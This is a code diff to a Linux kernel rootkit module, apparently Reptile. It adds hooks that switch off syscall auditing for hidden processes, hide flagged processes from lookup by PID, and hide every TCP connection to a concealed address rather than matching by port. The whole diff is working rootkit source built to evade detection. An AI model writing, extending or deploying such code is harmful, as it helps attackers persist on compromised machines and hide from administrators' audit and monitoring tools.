@@ -5,6 +5,7 @@
  *
  */
 
+#include <linux/audit.h>
 #include <linux/binfmts.h>
 #include <linux/cred.h>
 #include <linux/dirent.h>
@@ -31,9 +32,9 @@
 #include <linux/workqueue.h>
 #include <net/inet_sock.h>
 
+#include "config.h"
 #include "engine/engine.c"
 #include "engine/engine.h"
-#include "config.h"
 
 #if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 20)
 #define REPTILE_INIT_WORK(_t, _f) INIT_WORK((_t), (void (*)(void *))(_f), (_t))
@@ -43,8 +44,7 @@
 
 #define bzero(b, len) (memset((b), '\0', (len)), (void)0)
 #define SSIZE_MAX 32767
-#define AUTH 0xdeadbeef
-#define HTUA 0xc0debabe
+#define FLAG 0x80000000
 #define RL_BUFSIZE 2048
 #define TOK_BUFSIZE 64
 #define TOK_DELIM                                      \
@@ -53,11 +53,14 @@
 		p[0] = 0x00000020;                     \
 		(char *)p;                             \
 	})
+
+/*  
+ *  All these definitions below is random and can be changed if you want
+ *  But make sure you will change that in sbin/util.h
+ */
 #define ID 12345
 #define SEQ 28782
 #define WIN 8192
-#define TMPSZ 150
-#define FLAG 0x80000000
 
 int hidden = 1, hide_module = 0, file_tampering = 0, control_flag = 0;
 struct workqueue_struct *work_queue;
@@ -887,7 +890,7 @@ static int khook_tcp4_seq_show(struct seq_file *seq, void *v)
 
 	list_for_each_entry(hc, &hidden_tcp_conn, list)
 	{
-		if (hc->addr.sin_port == dport &&
+		if ( //hc->addr.sin_port == dport &&
 		    hc->addr.sin_addr.s_addr == daddr) {
 			ret = 0;
 			goto out;
@@ -939,6 +942,35 @@ static void khook_exit_creds(struct task_struct *p)
 		p->flags &= ~FLAG;
 
 	KHOOK_PUT(exit_creds);
+}
+
+KHOOK(audit_alloc);
+static int khook_audit_alloc(struct task_struct *t)
+{
+	int err = 0;
+
+	KHOOK_GET(audit_alloc);
+	if (t->flags & FLAG) {
+		clear_tsk_thread_flag(t, TIF_SYSCALL_AUDIT);
+	} else {
+		err = KHOOK_ORIGIN(audit_alloc, t);
+	}
+	KHOOK_PUT(audit_alloc);
+	return err;
+}
+
+KHOOK(find_task_by_vpid);
+struct task_struct *khook_find_task_by_vpid(pid_t vnr)
+{
+	struct task_struct *tsk = NULL;
+
+	KHOOK_GET(find_task_by_vpid);
+	tsk = KHOOK_ORIGIN(find_task_by_vpid, vnr);
+	if (tsk && (tsk->flags & FLAG) && !(current->flags & FLAG))
+		tsk = NULL;
+
+	KHOOK_PUT(find_task_by_vpid);
+	return tsk;
 }
 
 static int __init reptile_init(void)
